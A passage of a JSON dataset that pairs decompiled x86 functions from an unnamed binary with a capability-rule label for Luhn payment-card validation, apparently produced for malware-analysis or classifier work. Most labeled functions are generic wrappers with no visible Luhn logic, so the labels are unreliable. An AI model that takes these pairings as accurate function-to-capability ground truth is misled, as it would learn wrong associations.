        "decompiled_code": "\nuint __cdecl fcn.0041e350(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00404f80(arg_8h);\n    fcn.0041cdd0(arg_8h + 0x18);\n    return in_ECX;\n}\n",
        "token_count": 73
    },
    "0041e570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e570(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint var_38h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    puVar1 = fcn.0041ea40(&var_38h, arg_ch);\n    var_28h = *puVar1;\n    var_24h = puVar1[1];\n    var_20h = puVar1[2];\n    var_1ch = puVar1[3];\n    var_14h = var_28h;\n    var_10h = var_24h;\n    var_ch = var_20h;\n    var_8h = var_1ch;\n    fcn.0041eb40(arg_8h, &var_14h, &arg_10h);\n    fcn.0043a2e7(arg_8h);\n    return;\n}\n",
        "token_count": 286
    },
    "0041e5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e5f0(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471c08;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = fcn.00401440(arg_18h);\n    arg_10h_00 = fcn.00401440(arg_14h);\n    arg_ch_00 = fcn.00401440(arg_10h);\n    fcn.0041eb80(0, arg_ch_00, arg_10h_00, uVar1);\n    var_4h = 0;\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.0041ec10(uVar1);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 278
    },
    "0041e690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041e690(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_14h = fcn.00401440(arg_10h);\n    arg_10h_00 = fcn.00401440(arg_ch);\n    arg_ch_00 = fcn.00401440(arg_8h);\n    fcn.0041ec40(0, arg_ch_00, arg_10h_00, arg_14h);\n    return in_ECX;\n}\n",
        "token_count": 174
    },
    "0041e6e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e6e0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471c38;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401b10(0xc);\n    fcn.0040a0b0(arg_10h, arg_14h);\n    var_4h = 0;\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x20) {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0041eca0(arg_8h_00);\n    }\n    fcn.0040a030();\n    var_4h = 0xffffffff;\n    fcn.0041e790();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_14h);\n    return;\n}\n",
        "token_count": 301
    },
    "0041e790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e790(uint *param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0041da80(*param_1, param_1[1], param_1[2]);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 131
    },
    "0041e7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.0041e7f0(code **param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uint var_18h;\n    uint var_10h_2;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x471c68;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    fcn.00415d40(0);\n    var_4h_2 = 0;\n    *param_1 = vtable.std::_Packaged_state_void____cdecl___void__.0;\n    arg_8h = fcn.00401440(var_8h);\n    fcn.0041ecf0(arg_8h);\n    fcn.0041efe0(arg_8h);\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 269
    },
    "0041e880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041e880(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t noname_14;\n    uint noname_9;\n    uint unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint noname_2;\n    uint arg_8h_00;\n    uint32_t noname_4;\n    uint var_34h;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    int32_t var_ch;\n    uint noname_16;\n    uint var_4h;\n    \n    noname_16 = 0x4718c8;\n    var_ch = *in_FS_OFFSET;\n    noname_14 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    noname_4 = noname_14;\n    noname_9 = fcn.00413b00(&var_34h, unaff_retaddr);\n    arg_8h_00 = noname_9;\n    fcn.004142c0(&arg_10h);\n    fcn.00414100(arg_8h_00);\n    fcn.00413b60();\n    noname_2 = 8;\n    fcn.00401b10(8);\n    fcn.0041f060(arg_ch, &arg_10h, noname_2, arg_8h_00, noname_4, var_34h, in_stack_ffffffcc, in_stack_ffffffd0, \n                 in_stack_ffffffd4, noname_9, noname_9, 0, var_18h, in_stack_ffffffe8, noname_14, var_ch, noname_16, 0, \n                 unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, \n                 in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n    fcn.00415150(&var_18h);\n    fcn.00415210();\n    fcn.004151d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 773
    },
    "0041e960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041e960(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t noname_14;\n    uint noname_9;\n    uint unaff_EBP;\n    int32_t *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint noname_2;\n    uint arg_8h_00;\n    uint32_t noname_4;\n    uint var_34h;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    int32_t var_ch;\n    uint noname_16;\n    uint var_4h;\n    \n    noname_16 = 0x4718c8;\n    var_ch = *in_FS_OFFSET;\n    noname_14 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    noname_4 = noname_14;\n    noname_9 = fcn.00413b00(&var_34h, unaff_retaddr);\n    arg_8h_00 = noname_9;\n    fcn.004142c0(&arg_10h);\n    fcn.00414100(arg_8h_00);\n    fcn.00413b60();\n    noname_2 = 8;\n    fcn.00401b10(8);\n    fcn.0041f1f0(arg_ch, &arg_10h, noname_2, arg_8h_00, noname_4, var_34h, in_stack_ffffffcc, in_stack_ffffffd0, \n                 in_stack_ffffffd4, noname_9, noname_9, 0, var_18h, in_stack_ffffffe8, noname_14, var_ch, noname_16, 0, \n                 unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014, \n                 in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n    fcn.00415150(&var_18h);\n    fcn.00415210();\n    fcn.004151d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 775
    },
    "0041ea40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ea40(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_stack_ffffff90;\n    uint *arg_8h_00;\n    uint var_54h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar2 = fcn.0041ef20(&var_2ch);\n    cVar1 = fcn.0041f380(arg_ch, uVar2);\n    if (cVar1 == '\\0') {\n        arg_8h_00 = &var_34h;\n        fcn.0041cbd0(&var_3ch);\n        uVar2 = fcn.0041d410(arg_8h_00);\n        fcn.0041f3c0(uVar2);\n        uVar2 = fcn.0041f400(&var_44h, arg_ch);\n        fcn.0041efa0(uVar2);\n        fcn.0041f510(&var_4ch, &var_ch);\n        _var_1ch = fcn.0041d450();\n        uVar2 = fcn.0041d630(&var_1ch);\n        fcn.0041f620(uVar2);\n        in_stack_ffffff90 = &var_24h;\n        fcn.0041ef70(in_stack_ffffff90);\n        var_14h = fcn.0041d450();\n    }\n    else {\n        _var_1ch = 0;\n        var_14h = 0;\n    }\n    *arg_8h = var_1ch;\n    arg_8h[1] = var_18h;\n    arg_8h[2] = var_14h;\n    arg_8h[3] = var_10h;\n    fcn.0043a2e7(in_stack_ffffff90);\n    return;\n}\n",
        "token_count": 511
    },
    "0041eb80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041eb80(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint arg_ch_00;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471c98;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = fcn.00401440(arg_14h);\n    arg_ch_00 = fcn.00401440(arg_10h);\n    fcn.0041f660(0, arg_ch_00, uVar1);\n    var_4h = 0;\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.0041ec10(uVar1);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 235
    },
    "0041ec40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041ec40(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint arg_ch_00;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_14h);\n    arg_ch_00 = fcn.00401440(arg_10h);\n    fcn.0041f6b0(0, arg_ch_00, uVar1);\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.0041ec10(uVar1);\n    return in_ECX;\n}\n",
        "token_count": 172
    },
    "0041eca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041eca0(uint arg_8h)\n\n{\n    uint arg_10h;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_10h = fcn.00401440(arg_8h);\n    arg_ch = fcn.00401440(*(in_ECX + 4));\n    fcn.0041d7a0(*(in_ECX + 8), arg_ch, arg_10h);\n    *(in_ECX + 4) = *(in_ECX + 4) + 0x20;\n    return;\n}\n",
        "token_count": 135
    },
    "0041ed70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ed70(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.0041eda0(arg_8h);\n    fcn.0041ee40(arg_8h + 0xc);\n    return in_ECX;\n}\n",
        "token_count": 71
    },
    "0041ee10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041ee10(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = *arg_8h;\n    fcn.0041ee60(arg_8h + 1);\n    return in_ECX;\n}\n",
        "token_count": 70
    },
    "0041efa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.0041efa0(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *in_ECX;\n    uint var_4h;\n    \n    uVar1 = *in_ECX;\n    uVar2 = *arg_8h;\n    uVar3 = arg_8h[1];\n    *in_ECX = uVar1 + *arg_8h;\n    in_ECX[1] = in_ECX[1] + uVar3 + CARRY4(uVar1, uVar2);\n    return in_ECX;\n}\n",
        "token_count": 151
    },
    "0041f380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041f380(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.0041f780(arg_ch, arg_8h);\n    var_4h = (uVar1 & 0xff) == 0;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 98
    },
    "0041f3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041f3c0(uint arg_8h)\n\n{\n    ulong uVar1;\n    uint var_ch;\n    uint *var_4h;\n    \n    fcn.0041f7f0(&var_ch, arg_8h);\n    uVar1 = fcn.0041d450();\n    *var_4h = uVar1;\n    var_4h[1] = uVar1 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 110
    },
    "0041f620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041f620(uint arg_8h)\n\n{\n    ulong uVar1;\n    uint var_ch;\n    uint *var_4h;\n    \n    fcn.0041f8f0(&var_ch, arg_8h);\n    uVar1 = fcn.0041d450();\n    *var_4h = uVar1;\n    var_4h[1] = uVar1 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 108
    },
    "0041f660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041f660(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_10h);\n    fcn.0041fa00(0, uVar1);\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.0041fa40(uVar1);\n    return in_ECX;\n}\n",
        "token_count": 135
    },
    "0041f6b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041f6b0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar1 = fcn.00401440(arg_10h);\n    fcn.0041fa70(0, uVar1);\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.0041fab0(uVar1);\n    return in_ECX;\n}\n",
        "token_count": 137
    },
    "0041f700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041f700(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint var_8h;\n    uint var_1h;\n    \n    cVar1 = fcn.0041fc30(arg_8h);\n    if (cVar1 != '\\0') {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0041fc70(arg_8h_00);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0041fa00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041fa00(uint noname_0, uint arg_ch)\n\n{\n    uint arg_8h;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00409fe0(0);\n    arg_8h = fcn.00401440(arg_ch);\n    fcn.0041fe40(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 112
    },
    "0041fa40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fa40(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00407620(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "0041fa70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041fa70(uint noname_0, uint arg_ch)\n\n{\n    uint arg_8h;\n    uint in_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00409fe0(0);\n    arg_8h = fcn.00401440(arg_ch);\n    fcn.0041fab0(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 112
    },
    "0041fab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fab0(uint arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401440(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 51
    },
    "0041fad0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fad0(uint arg_8h)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0041fbc0(0);\n    if (arg_8h != '\\0') {\n        fcn.00408d50(in_ECX, 0x30);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 155
    },
    "0041fb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fb30(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00401440(param_1 + 4);\n    return;\n}\n",
        "token_count": 45
    },
    "0041fb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fb60(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401300(0x30, arg_8h);\n    arg_8h_00 = fcn.00401440(in_ECX + 4);\n    fcn.0041fe70(arg_8h_00);\n    return;\n}\n",
        "token_count": 107
    },
    "0041fbf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0041fbf0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0041dab0(param_1);\n    return;\n}\n",
        "token_count": 59
    },
    "0041fc10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fc10(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0041feb0(param_1 + 4);\n    return;\n}\n",
        "token_count": 46
    },
    "0041fc30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0041fc30(uint arg_8h)\n\n{\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    fcn.004194d0(arg_8h, in_ECX >> 0x18);\n    return;\n}\n",
        "token_count": 76
    },
    "0041fc50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fc50(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00420680(param_1 + 4);\n    return;\n}\n",
        "token_count": 45
    },
    "0041fc70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041fc70(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00401440(arg_8h);\n    uVar1 = fcn.004206a0(uVar1);\n    fcn.0040f2f0(uVar1);\n    return;\n}\n",
        "token_count": 82
    },
    "0041fe40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041fe40(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041edf0(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 83
    },
    "0041fe70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041fe70(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.00402930();\n    *in_ECX = 0x4864d4;\n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.0041ecf0(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 107
    },
    "0041feb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041feb0(uint param_1)\n\n{\n    uint arg_ch;\n    uint arg_8h;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x471cf0;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    arg_ch = fcn.00408d10(0x30);\n    var_4h = 0;\n    fcn.00401300(0x30, arg_ch);\n    arg_8h = fcn.00401440(var_8h);\n    fcn.00420750(arg_8h);\n    *in_FS_OFFSET = var_ch_2;\n    return arg_ch;\n}\n",
        "token_count": 223
    },
    "004200b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004200b0(uint *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x486550;\n    fcn.00406250(uVar1);\n    fcn.004264ce();\n    fcn.0040e930();\n    fcn.00413600();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 180
    },
    "004202c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004202c0(uint *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x48655c;\n    fcn.00406250(uVar1);\n    fcn.004264ce();\n    fcn.0040e930();\n    fcn.00413600();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 181
    },
    "00420440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00420440(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.004135e0();\n    *in_ECX = 0x486550;\n    fcn.00411190(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 73
    },
    "00420490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00420490(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    fcn.004135e0();\n    *in_ECX = 0x48655c;\n    fcn.00411190(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 74
    },
    "004204e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
